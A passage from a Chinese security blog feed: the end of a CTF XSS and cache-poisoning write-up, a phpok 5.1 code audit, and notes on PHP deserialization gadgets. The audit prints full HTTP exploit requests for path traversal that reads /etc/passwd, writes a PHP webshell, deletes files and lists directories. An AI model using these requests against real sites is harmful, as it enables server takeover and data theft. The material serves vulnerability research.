alt="image_1d6k708dj1sqj193mcd518141usd8j.png-395.6kB"></p><p><img src="http://static.zybuluo.com/Passer6y/evj10n1lgofc4x7ol86k23wr/image_1d6k6t6d78iu1aa8tj3pcaveu7m.png" alt="image_1d6k6t6d78iu1aa8tj3pcaveu7m.png-85.6kB"></p><p>然后就很简单了，将admin的源码打回vps<br><img src="http://static.zybuluo.com/Passer6y/sbhh9jy15u0nq9oe5keuxns1/image_1d6k7abmntd712rr1c9o173f1gji90.png" alt="image_1d6k7abmntd712rr1c9o173f1gji90.png-375.5kB"></p><p><img src="http://static.zybuluo.com/Passer6y/4696blrna7uanhfmmazmwr8d/image_1d6k7bkl9oet1o6f152b1fk1ihqb0.png" alt="image_1d6k7bkl9oet1o6f152b1fk1ihqb0.png-105.5kB"><br>flag: <code>p4{15_1t_1m4g3_or_n0t?}</code></p><p>具体的原理可以学习这篇文文章：<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">深入理解浏览器解析机制和XSS向量编码</a></p><h2 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h2><p>这算非预期解法，前面我们提到了<code>select</code>标签处有一个self-xss，但是一直没有利用点，后来在hpdoger师傅的交流中，从返回包中可以看到这题中用到了cloudFlare,于是尝试了一下缓存投毒，将self-xss变成可利用的反射型xss。</p><p>这里有个特征,我们如果注册的名字为<code>passer8y.js</code>,url中会以<code>passer8y.js</code>为文件名:<br><img src="http://static.zybuluo.com/Passer6y/57ecdxqaj6l21zreyyvq2jbm/image_1d6k9213i1uurpqh1k0n5lspg7bq.png" alt="image_1d6k9213i1uurpqh1k0n5lspg7bq.png-57kB"></p><p>接着发送这样一个数据包, 可以看到被缓存到cloudflare里去了。<br><img src="http://static.zybuluo.com/Passer6y/v428jhn3pqz6he2it9z2toye/image_1d6k9rtlq1vnh1icca2a2dd10bcd1.png" alt="image_1d6k9rtlq1vnh1icca2a2dd10bcd1.png-321.1kB"></p><p>直接访问：<a href="http://web50.zajebistyc.tf/profile/passer8y.js，" target="_blank" rel="noopener">http://web50.zajebistyc.tf/profile/passer8y.js，</a> 自动进行了一次跳转，所以我们成功将xss缓存进了cloudflare。<br><img src="http://static.zybuluo.com/Passer6y/9em40gvr75c4r4srk6yp688p/image_1d6k9vckj3rm5ik152p6j2incde.png" alt="image_1d6k9vckj3rm5ik152p6j2incde.png-56.6kB"></p><p>但是bot似乎不会跟进location跳转，所以我们得构造其他payload去打源码</p><p>这里在种缓存的时候有个小点需要注意，我们注册xxx.js的账户完了点进profile页面那次就会缓存到cloudflare，然后我们再次修改profile页面资料时，并不会修改cloudflare的缓存。所以我们要提前抓好注册和修改profile的包(或者写脚本)，第一次访问就得种上我们的payload。</p><p>这里可以用js的Fetch API 去读取admin的profile页面，然后在回调的过程创建一个image图片将返回内容打到我们vps。参考mdn的文档：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch</a></p><p>复现的时候貌似bot挂了，暂时先这样吧。</p><h1 id="My-admin-panel"><a href="#My-admin-panel" class="headerlink" title="My admin panel"></a>My admin panel</h1><p>考察php弱类型绕过，一般我们gpc传入的数据服务端接受到的都是字符型(而弱类型比较需要字符串和数值类型的两个数据进行弱类型比较)，而如果此时使用了类似于<code>json_decode()</code>这样的解码函数，我们仍可以传入数值类型的数据：<br>这样传入的hash值为数值类型：<code>{&quot;hash&quot;: 389}</code><br>而这样为字符型：<code>{&quot;hash&quot;: &quot;389&quot;}</code></p><p><img src="http://static.zybuluo.com/Passer6y/5ucuabe0nuqwd4f76796d74i/image_1d6kllkqk1mv9i7vl0i7uh1q7e9.png" alt="image_1d6kllkqk1mv9i7vl0i7uh1q7e9.png-65.2kB"></p><p>参考：<br><a href="https://blog.csdn.net/microad_liy/article/details/6733847" target="_blank" rel="noopener">image xss 1.图片发生xss攻击的条件、原因及对策</a><br><a href="https://lorexxar.cn/2015/11/19/xss-link/" target="_blank" rel="noopener">xss link&amp;svg黑魔法</a><br><a href="https://hackerone.com/reports/148853" target="_blank" rel="noopener">hackone-Stored XSS using SVG</a><br><a href="https://ctftime.org/writeup/13925" target="_blank" rel="noopener">Web 50</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0day.design/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://0day.design/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>phpok 最新版（5.1） 审计</title>
    <link href="http://0day.design/2019/03/07/phpok%20%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%885.1%EF%BC%89%20%E5%AE%A1%E8%AE%A1/"/>
    <id>http://0day.design/2019/03/07/phpok 最新版（5.1） 审计/</id>
    <published>2019-03-07T08:46:00.000Z</published>
    <updated>2019-04-15T02:02:18.574Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发：<a href="https://www.anquanke.com/post/id/172110" target="_blank" rel="noopener">安全客</a> </p><p>前言：最近审了一下phpok，能力有限，目前找到的大部后台一些能利用的洞，涉及到的漏洞类型也挺多的，能getshell，在这里分享一些自己的拙见~<br><a id="more"></a></p><h2 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h2><p>官网下载最新的phpok 5.1版本：<a href="https://phpok.com" target="_blank" rel="noopener">https://phpok.com</a></p><p>首先可以黑白盒结合的方式来分析路由解析规则：<br><img src="http://static.zybuluo.com/Passer6y/zlxqgpk6lnjnh5bjm4ajyn0m/image_1d4l2nmm01gsc1k06f30qjqsrl9.png" alt="image_1d4l2nmm01gsc1k06f30qjqsrl9.png-95.9kB"></p><p>跟目下有这么几个入口文件：<br><img src="http://static.zybuluo.com/Passer6y/kccx9ephq6ctm4olaje1rf6o/image_1d4cm58lf1oqb17lf13h7c6ncvc9.png" alt="image_1d4cm58lf1oqb17lf13h7c6ncvc9.png-100.1kB"></p><p>纵览整个目录，容易发现该程序是<a href="https://baike.baidu.com/item/MVC%E6%A1%86%E6%9E%B6/9241230?fr=aladdin&amp;fromid=85990&amp;fromtitle=MVC" target="_blank" rel="noopener">mvc的模式</a>来编写的，至少有三个入口：<br>index.php,api.php,admin.php</p><p>所以，我们可以打开框架目录<code>framework/</code>来印证这个猜想：<br><img src="http://static.zybuluo.com/Passer6y/ehejnl7eo1wwq6qk9exaew35/image_1d4l30uhq19daamv1mej17731drmm.png" alt="image_1d4l30uhq19daamv1mej17731drmm.png-122.9kB"></p><p>这时候我们可以结合黑盒的方式看具体的解析到具体文件(控制器)以及具体的方法的过程，安装后网站后，随便点开个页面，观察参数变化：<br><img src="http://static.zybuluo.com/Passer6y/kdq6c1wupjw5n6mmgu3rucgy/image_1d4l36cio8m11o13c87e5crr513.png" alt="image_1d4l36cio8m11o13c87e5crr513.png-55.1kB"><br>再看看后台：<br><img src="http://static.zybuluo.com/Passer6y/dygurkcwqte8y7gpub64bj4a/image_1d4l39hud1krpd401i9d51lp0v2g.png" alt="image_1d4l39hud1krpd401i9d51lp0v2g.png-92.8kB"></p><p>到这里其实差不多已经知道解析规则了，比如：<br><code>http://phpok/index.php?c=cart&amp;f=checkout&amp;id[]=2</code></p><ul><li>入口：<code>index.php</code></li><li>控制器：参数<code>c=cart</code>，对应着框架目录<code>www</code>模块，路径：<code>framework/www/cart_control.php</code><br><img src="http://static.zybuluo.com/Passer6y/1d5orre48mzx3jw15dg7rkgo/image_1d4l3gobj145fo0v1rov16hh1q6m2t.png" alt="image_1d4l3gobj145fo0v1rov16hh1q6m2t.png-76.4kB"></li><li>方法：参数<code>f=checkout</code>，对应着<code>checkout_f()</code>方法<br><img src="http://static.zybuluo.com/Passer6y/x5rn1nz23qc78pah3mymjz7z/image_1d4l3lc5l6g7f571qp13nd10283a.png" alt="image_1d4l3lc5l6g7f571qp13nd10283a.png-90.3kB"></li></ul><blockquote><p>路由文件中会自动将f参数最后加入<code>_f</code></p></blockquote><p>反观，比如我们要调用<code>framework/admin/freight_control.php</code>的<code>price_save_f()</code>方法：<br><img src="http://static.zybuluo.com/Passer6y/j0v5o5eyxn3ae734kbqn1ob9/image_1d4cm983ng031ntgjpr1cah1co7m.png" alt="image_1d4cm983ng031ntgjpr1cah1co7m.png-230.7kB"></p><p>对应的url即：<code>http://phpok/admin.php?c=freight&amp;f=price_save</code></p><p><strong>即在控制器中，只有以<code>_f</code>结尾的函数名可以直接调用</strong></p><p>知道文件解析规则了，下面就可以从入口开始审，审全局过滤，审相关敏感函数进行回溯等等。</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>从框架入口跟进后，发现<code>framework/init.php</code> 1611行存在<code>parse_str</code>变量覆盖<br><img src="http://static.zybuluo.com/Passer6y/p13wmvj4khkxren72b6fdvhj/image_1d4agk20clki110s1ii7u6q1gah9.png" alt="image_1d4agk20clki110s1ii7u6q1gah9.png-146.3kB"></p><p><code>$query_string</code>参数从<code>framework/libs/server.php</code> 94行传入：</p><p><img src="http://static.zybuluo.com/Passer6y/3jsnuyq9m72tfqg330ytcfib/image_1d4agn7g08k431a1fsakoi1kjdm.png" alt="image_1d4agn7g08k431a1fsakoi1kjdm.png-135.9kB"></p><p>比如访问：<code>http://phpok/?data[script]=passer6y</code><br><img src="http://static.zybuluo.com/Passer6y/fgpw2yg6wjc5o5r1hm9fqx08/image_1d4ai86gk1ukh1dd0lgt83e6nl9.png" alt="image_1d4ai86gk1ukh1dd0lgt83e6nl9.png-228.1kB"></p><p>如果想要利用的话最好是能覆盖全局变量，<code>$_SESSION，$config</code>这些，我在尝试覆盖<code>$_SESSION</code>的时候传入<code>?_SESSION[script]=passer6y</code>,经过动态调试后，发现会自动多加一个下划线，变成这样<code>__SESSION[script]=passer6y</code>。</p><p>后来也尝试了利用<code>$_GET</code>变量的一些特性在处理参数的时候，会将参数名中的<code>空格</code>、<code>.</code>、<code>[</code>替换成<code>_</code>，比如传入<code>.SESSION[script]=passer6y</code>会解析成<code>_SESSION[script]=passer6y</code>，但最终还是没有成功覆盖，师傅们有好的思路一起来交流交流~</p><h2 id="后台任意文件读取"><a href="#后台任意文件读取" class="headerlink" title="后台任意文件读取"></a>后台任意文件读取</h2><p>跟完框架入口核心文件之后，然后进框架目录的www模块,跟完了也没挖到一个洞，接着就开始审核心的libs库，看功能点来回溯，接着就找到了这么些后台洞：</p><p><img src="http://static.zybuluo.com/Passer6y/r72b5eovgrfy2j0oeeeei79x/image_1d4l4l7km1eaimer1c8ld1c18sv9.png" alt="image_1d4l4l7km1eaimer1c8ld1c18sv9.png-38.1kB"><br>当时在审框架里面的libs库里的file.php，看到cat命令眼前一亮<br><img src="http://static.zybuluo.com/Passer6y/pv6mu4h93o84a3o6vbjck74b/image_1d4i1bkhf1fbq1q6nk7g19pe1hjl23.png" alt="image_1d4i1bkhf1fbq1q6nk7g19pe1hjl23.png-402.7kB"></p><p>回溯到了：<br>framework/admin/tpl_control.php<br><img src="http://static.zybuluo.com/Passer6y/pfb89v0i59glsveyitgnmsa5/image_1d4i1oe4tg81163s1hcn18a21kp530.png" alt="image_1d4i1oe4tg81163s1hcn18a21kp530.png-197.8kB"></p><p>framework/admin/appsys_control.php<br><img src="http://static.zybuluo.com/Passer6y/hg2cxnqchsm3renmw1sjlvfr/image_1d4i1pat21lbr1fe518r01rf2tjs3d.png" alt="image_1d4i1pat21lbr1fe518r01rf2tjs3d.png-443.2kB"></p><p>有两处均存在该问题：</p><p>exp1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php?c=appsys&amp;f=file_edit&amp;id=fav&amp;title=../../../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: phpok</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure></p><p>exp2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php?c=tpl&amp;f=edit&amp;id=1&amp;title=../../../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: phpok</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/p2zlylym1mfm33vj2rjbmgw5/image_1d4l4ok81h0c1ee2dk2ann3p1m.png" alt="image_1d4l4ok81h0c1ee2dk2ann3p1m.png-521.8kB"><br><img src="http://static.zybuluo.com/Passer6y/bs2osjm0xntsb9zqzhl9ulyo/image_1d4i1rfar1g7u1ieefsrd4dd0l3q.png" alt="image_1d4i1rfar1g7u1ieefsrd4dd0l3q.png-280.1kB"></p><h2 id="后台任意文件写入getshell"><a href="#后台任意文件写入getshell" class="headerlink" title="后台任意文件写入getshell"></a>后台任意文件写入getshell</h2><p>libs库时候发现的，framework/libs/file.php 108行：<br><img src="http://static.zybuluo.com/Passer6y/awxmk7gqoazwfskrczgm6diu/image_1d4l58h6eo1l7892im1v7g16352g.png" alt="image_1d4l58h6eo1l7892im1v7g16352g.png-40.8kB"></p><p>跟进<code>make()</code>函数，185行：<br><img src="http://static.zybuluo.com/Passer6y/jyu4m8ywltgdccn0qugy8chf/image_1d4l59l5p1j23upj6grfd1a842t.png" alt="image_1d4l59l5p1j23upj6grfd1a842t.png-220.1kB"><br>可以看到是用来创建文件或目录的函数</p><p>继续跟<code>_write()</code>函数，同文件394行：<br><img src="http://static.zybuluo.com/Passer6y/344q4ca2sky0t9anxcdwv1ez/image_1d4l5c0qh1h79tbr16bj1i191a223a.png" alt="image_1d4l5c0qh1h79tbr16bj1i191a223a.png-80.9kB"><br>良心的程序员还帮我们把转义符给去掉了</p><p>分析到这里基本可以知道如果<code>vim()</code>函数可控，那么可以写入任意文件</p><p>使用phpstorm <code>command+shift+f</code>全局搜索<br><img src="http://static.zybuluo.com/Passer6y/tkwncti7c0woomb9v86n13bh/image_1d4l5lbfr1fek1kfa1a9i1nta1hcn47.png" alt="image_1d4l5lbfr1fek1kfa1a9i1nta1hcn47.png-423.3kB"></p><p>在<code>framework/admin/tpl_control.php</code>的383行找到<code>edit_save_f()</code></p><p><img src="http://static.zybuluo.com/Passer6y/fpwbu40s2yhrz8u9bobpypgy/image_1d4l5pf9lkqtv2q8cr1t6f6ku4k.png" alt="image_1d4l5pf9lkqtv2q8cr1t6f6ku4k.png-280.9kB"></p><p>下面构造exp就很简单了。</p><p><img src="http://static.zybuluo.com/Passer6y/uqtqxwzg456sh1iuoxi1vcpa/image_1d4l51jr2o901dl4r9ff6vfus13.png" alt="image_1d4l51jr2o901dl4r9ff6vfus13.png-524.5kB"></p><p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php?c=tpl&amp;f=edit_save&amp;id=1&amp;title=../../../../../../../Users/passer6y/Documents/www/phpok/version.php&amp;content=&lt;%3fphp+phpinfo()%3becho+&quot;passer6y&quot;%3b%3f&gt; HTTP/1.1</span><br><span class="line">Host: phpok</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure></p><p>在framework/admin/tpl_control.php  383行 edit_save_f()函数也有这个问题<br><img src="http://static.zybuluo.com/Passer6y/v8l0twvzk43u4oyzev8zes3m/image_1d4ig2hol1ok17857k61r66bv74k.png" alt="image_1d4ig2hol1ok17857k61r66bv74k.png-383.1kB"></p><h2 id="后台任意文件删除"><a href="#后台任意文件删除" class="headerlink" title="后台任意文件删除"></a>后台任意文件删除</h2><p>同样类似的方法在framework/admin/tpl_control.php 303行 <code>delfile_f()</code>函数：<br><img src="http://static.zybuluo.com/Passer6y/zb6si257j56p2qexs7ecsed1/image_1d4l604qqo9c1krlerf7eu1o1b51.png" alt="image_1d4l604qqo9c1krlerf7eu1o1b51.png-247.1kB"></p><p>在libs库中，framework/libs/file.php，148行<code>rm()</code>函数也存在该问题<br><img src="http://static.zybuluo.com/Passer6y/5zowcit791ndjvyt3vxp5yb7/image_1d4l61nqml2roi8i4jv1j1aif5e.png" alt="image_1d4l61nqml2roi8i4jv1j1aif5e.png-151.4kB"></p><p>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php?c=tpl&amp;f=delfile&amp;id=1&amp;title=../../../../../../../Users/passer6y/Documents/www/phpok/version.php HTTP/1.1</span><br><span class="line">Host: phpok</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/1a2eynhxyhmmljm5z9ok36qx/image_1d4ijnk021ui812v11pc8fap1sb351.png" alt="image_1d4ijnk021ui812v11pc8fap1sb351.png-172kB"></p><h2 id="后台文件重命名"><a href="#后台文件重命名" class="headerlink" title="后台文件重命名"></a>后台文件重命名</h2><p>这种漏洞只能和其他洞打组合拳利用才能玩</p><p>framework/admin/tpl_control.php</p><p>182行：<br><img src="http://static.zybuluo.com/Passer6y/f3046swiq74ti2j1iy4bkx0u/image_1d4jrep0n147ufdpgr21k8md3a9.png" alt="image_1d4jrep0n147ufdpgr21k8md3a9.png-273.4kB"></p><p>跟进215行：<code>$this-&gt;lib(&#39;file&#39;)-&gt;mv($file,$newfile);</code></p><p>framework/libs/file.php 269行：<br><img src="http://static.zybuluo.com/Passer6y/w72a50ygueplfvt39s3gj3a4/image_1d4l6afmq17svv8q28m3ev1sih5r.png" alt="image_1d4l6afmq17svv8q28m3ev1sih5r.png-123.9kB"></p><p>利用条件比较多，得知道文件名，其次想拿shell的话，得想办法写入自己的shell,比如想办法写到缓存里或者其他的，然后把原本不能当php解析的改成php扩展名等等..</p><h2 id="后台列目录"><a href="#后台列目录" class="headerlink" title="后台列目录"></a>后台列目录</h2><p>framework/admin/appsys_control.php   358行 <code>filelist_f()</code></p><p><img src="http://static.zybuluo.com/Passer6y/0dffvgai9y9fd4cv0bozqgjl/image_1d4juou7p14v9nli1isr1u561ee51m.png" alt="image_1d4juou7p14v9nli1isr1u561ee51m.png-274.2kB"></p><p><code>$tpl_list = $this-&gt;lib(&#39;file&#39;)-&gt;ls($tpl_dir);</code> 388行</p><p>跟进：<br><img src="http://static.zybuluo.com/Passer6y/6vda01kdf6371cgnylfro3p3/image_1d4l6siej1ud37qu1ebv1fd11d1m9.png" alt="image_1d4l6siej1ud37qu1ebv1fd11d1m9.png-146.6kB"></p><p>至于id传入啥参数，可以根据这个<code>$rs = $this-&gt;model(&#39;tpl&#39;)-&gt;get_one($id);</code>根据路由跟进到：<code>framework/model/appsys.php</code> 117行：id对应着<code>_app</code>目录下的文件名</p><p><img src="http://static.zybuluo.com/Passer6y/nyc1cs1p2pcmesp9fw5rmvr5/image_1d4l7b4pd1d0186u17a8cm1ehsm.png" alt="image_1d4l7b4pd1d0186u17a8cm1ehsm.png-197.4kB"></p><p>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /admin.php?c=appsys&amp;f=filelist&amp;id=fav&amp;folder=../../../../ HTTP/1.1</span><br><span class="line">Host: phpok</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.8d Safari/537.36</span><br><span class="line">content-type: application/json</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">PHPSESSION: ilc9ev2s0fv8rn9hckfh07hni3</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">request_type: ajax</span><br><span class="line">phpok_ajax: 1</span><br><span class="line">Referer: http://phpok/index.php?id=news&amp;cate=company</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/exb2sbtm64zn2dpmlgsx58xj/image_1d4l7d16r1aqq19ov1fn312vi10k023.png" alt="image_1d4l7d16r1aqq19ov1fn312vi10k023.png-177.9kB"></p><p>背锅的file文件：framework/libs/file.php…</p><p>能力有限,只能挖出这么些鸡肋洞，希望各位师傅多多指点~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章首发：&lt;a href=&quot;https://www.anquanke.com/post/id/172110&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全客&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;前言：最近审了一下phpok，能力有限，目前找到的大部后台一些能利用的洞，涉及到的漏洞类型也挺多的，能getshell，在这里分享一些自己的拙见~&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
      <category term="代码审计" scheme="http://0day.design/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化原生类利用</title>
    <link href="http://0day.design/2019/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"/>
    <id>http://0day.design/2019/03/05/php反序列化原生类利用/</id>
    <published>2019-03-05T08:25:00.000Z</published>
    <updated>2019-03-05T08:27:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>梳理和总结了一下最近学的东西~<br><a id="more"></a></p><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><h3 id="phar无unserialize-反序列化"><a href="#phar无unserialize-反序列化" class="headerlink" title="phar无unserialize()反序列化"></a>phar无unserialize()反序列化</h3><p>利用条件：</p><ul><li>一个上传点</li><li>一个可控的文件操作函数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://www.anquanke.com/post/id/159206#h3-17" target="_blank" rel="noopener">Hpdoger师傅的四个实例递进php反序列化漏洞理解</a><br><a href="https://www.anquanke.com/post/id/157439" target="_blank" rel="noopener">Blackhat议题解读 | phar反序列化</a></p><h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>利用条件：</p><ul><li>session解析引擎可控(在同一网站能同时出现两种不同的session配置方式)</li><li><code>$_SESSION</code>值可控</li></ul><p>修改session存储方式可以通过<code>session_start()</code>函数，给其传入<code>serialize_handler=php_serialize</code>参数即可。<br>具体见：<br><a href="http://passer6y.fun/2019/02/10/LCTF%202018%20Babyphp&#39;s%20revenge/" target="_blank" rel="noopener">LCTF 2018 Babyphp’s revenge</a></p><h2 id="php原生类利用"><a href="#php原生类利用" class="headerlink" title="php原生类利用"></a>php原生类利用</h2><h3 id="Soapclient"><a href="#Soapclient" class="headerlink" title="Soapclient"></a>Soapclient</h3><p>利用条件：</p><ul><li>需要有soap扩展</li><li>需要有一个能实例化对象的点</li><li>需要调用一个不存在的方法触发其<code>__call()</code>函数</li></ul><p>参考：<a href="http://passer6y.fun/2019/02/10/LCTF%202018%20Babyphp&#39;s%20revenge/" target="_blank" rel="noopener">LCTF 2018 Babyphp’s revenge</a></p><p>危害：盲打SSRF:可以结合Soapclient自身的CRLF漏洞，带上各种heade头参数。</p><p>参考: <a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">反序列化之PHP原生类的利用</a></p><h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>利用条件：</p><ul><li>有实例化对象的点即可</li></ul><p>危害：列目录</p><p>参考：<a href="http://passer6y.fun/2019/02/14/PHP%20SECURITY%20CALENDAR%202017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017-Day 3 - Snow Flake</a></p><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><p>利用条件：</p><ul><li>xmllib库为存在漏洞的版本</li><li>有实例化对象的点即可</li></ul><p>危害：</p><ul><li>任意文件读取</li><li>SSRF</li></ul><blockquote><p>盲打xxe姿势见参考链接</p></blockquote><p>参考：<a href="http://passer6y.fun/2019/02/14/PHP%20SECURITY%20CALENDAR%202017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017-Day 3 - Snow Flake</a></p><p>参考：<a href="https://xz.aliyun.com/t/2571#toc-13" target="_blank" rel="noopener">XML外部实体注入小结</a></p><!--##  反射类的使用<?php/** * 调用PHP反射类获取类信息 * Date:    2017-05-24 * Author:  fdipzone * Ver:     1.0 * * Func * public static setClass       设置反射类 * public static getBase        读取类基本信息 * public static getInterfaces  读取类接口 * public static getProperties  读取类属性 * public static getMethods     读取类方法 */class Ref{    private static $refclass = null;    // 设置反射类    public static function setClass($classname){        self::$refclass = new ReflectionClass($classname);    }    // 读取类基本信息    public static function getBase(){        echo '<strong>BASE INFO</strong>'.PHP_EOL;        echo 'class name: '.self::$refclass->getName().PHP_EOL;        echo 'class path: '.dirname(self::$refclass->getFileName()).PHP_EOL;        echo 'class filename: 